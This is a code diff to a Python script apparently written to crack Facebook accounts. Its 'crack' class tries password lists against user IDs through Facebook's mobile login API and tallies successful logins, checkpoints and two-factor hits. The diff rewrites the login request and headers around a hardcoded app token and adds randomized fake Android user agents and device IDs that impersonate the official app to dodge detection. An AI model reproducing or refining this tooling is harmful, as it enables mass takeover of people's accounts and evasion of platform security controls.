@@ -138,7 +138,23 @@ for xd in range(5000):
     l='Safari/537.36 Edg/'
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugenn.append(uaku2)
-
+import random
+fban = random.choice(["FB4A"])
+facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
+fbbv = str(random.randint(10000000, 66666666))
+density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
+width = random.choice(["720", "1080", "1280"])
+height = random.choice(["720", "1080", "1280", "1440", "1920"])
+#fbrv = str(random.randint(10000000, 99999999))
+fbcr = random.choice(['Nepal_Telecom', 'DOCTYPE', 'MTN-CG', 'Cellcom', 'Salaam Telecom', 'BASE'])
+#model = random.choice(self.models).rsplit('|')
+fblc = random.choice(["en_US", "en_GB", "en_PK"])
+fbbd = 'samsung'
+fbpn = random.choice(["com.facebook.katana"])
+fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
+fbmf = 'samsung'
+fbdv = random.choice(["SM-G920F", "SM-T535", "SM-T231", "SM-J320F", "GT-I9190", "GT-N7100", "SM-T561", "GT-N7100", "GT-I9500", "SM-J320F", "SM-G930F", "SM-J320F", "SM-J510FN", "GT-P5100", "SM-J320F", "SM-T531", "SPH-L720", "GT-I9500"])
+user_agent= f"\033[0;32m[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{fbdv};FBSV/{fbsv};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
 ok = []
 cp = []
 f2 = []
@@ -669,44 +685,47 @@ class crack:
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 #ua_string = 'SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+gtt+' Build/'+gttt+') [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/'+application_version_code+';FBAV/'+application_version+';FBDV/'+gtt+';FBLC/vi_VN;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]'
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/it_IT;FBRV/574206407;FBCR/vodafone IT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A546B;FBSV/14;FBOP/1;FBCA/arm64-v8a:;]'
-                "format": "json",
-"device_id":adid,
-"cpl": "true",
-'family_device_id':nmm,
-"credentials_type": "device_based_login_password",
-"error_detail_type": "button_with_disabled",
-"source": "device_based_login",
-"source": "login","format": "json",
-"email":user,
-"password":pw,
-"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-"generate_session_cookies": "1",
-"generate_analytics_claim": "1",
-"generate_machine_id": "1",
-"meta_inf_fbmeta": "",
-"advertiser_id":adid,
-"currently_logged_in_userid": "0",
-"locale":"en_US","client_country_code":"US",
-"method": "auth.login",
-"fb_api_req_friendly_name": "authenticate",
-"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-"api_key": "882a8490361da98702bf97a021ddc14d"}
-                head = {'User-Agent': randBuildLSB(),
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                data = {
+                    'locale':'en-US',
+                    'client_country_code':'US',
+                    'adid':adid,
+                    'api_key':'882a8490361da98702bf97a021ddc14d',
+                    'email':user,
+                    'password':pw,
+                    'community_id':'',
+                    'secure_family_device_id':'',
+                    'cpl':'true',
+                    'currently_logged_in_userid':'0',
+                    'device_id':device,
+                    'fb_api_caller_class':'AuthOperations'+'$Password'+'AuthOperation',
+                    'fb_api_req_friendly_name':'authenticate',
+                    'format':'json',
+                    'generate_analytics_claim':'1',
+                    'generate_machine_id':'1',
+                    'generate_session_cookies':'1',
+                    'jazoest':str(random.randint(2e4,4e4)),
+                    'meta_inf_fbmeta':'NO_FILE',
+                    'source':'login',
+                    'try_num':'1',
+                    'credentials_type':'password'
+                }
+                head={
+                    'x-fb-connection-quality':'EXCELLENT',
+                    'x-fb-connection-type':'MOBILE.LTE',
+                    'user-agent':ua_string,
+                    'x-tigon-is-retry':'False',
+                    'x-fb-http-engine':'Liger',
+                    'x-fb-client-ip':'True',
+                    'x-fb-server-cluster':'True',
+                    'x-fb-device-group':'5120',
+                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
+                    'x-fb-net-hni':str(random.randint(2e4,4e4)),
+                    'x-fb-rmd':'cached=0;state=NO_MATCH',
+                    'x-fb-request-analytics-tags':'unknown',
+                    'authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                    'content-type':'application/x-www-form-urlencoded',
+                    'x-fb-friendly-name':'authenticate'
+                }
                 po=requests.post(_jat, data=data, headers=head, allow_redirects=False).text
                 q = json.loads(po)
                 if 'session_key' in str(q) or 'c_user' in str(q):
@@ -793,7 +812,7 @@ class crack:
 
     def __mmb__(self,user,__juts__,_jat):
         global ok,cp,f2,tl
-        sys.stdout.write(f'\r{OO}[Crack] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
+        sys.stdout.write(f'\r{OO}[Crack][M3] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -807,7 +826,9 @@ class crack:
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/366716093;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/366716093;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                ua_string2 = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/fr_FR;FBCR/Orange Communications SA;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONE A2001;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
+                ua_string3 = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_GB;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/YOGA Tablet 2-1050F;FBSV/5.0.1;nullFBCA/x86:armeabi-v7a;]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
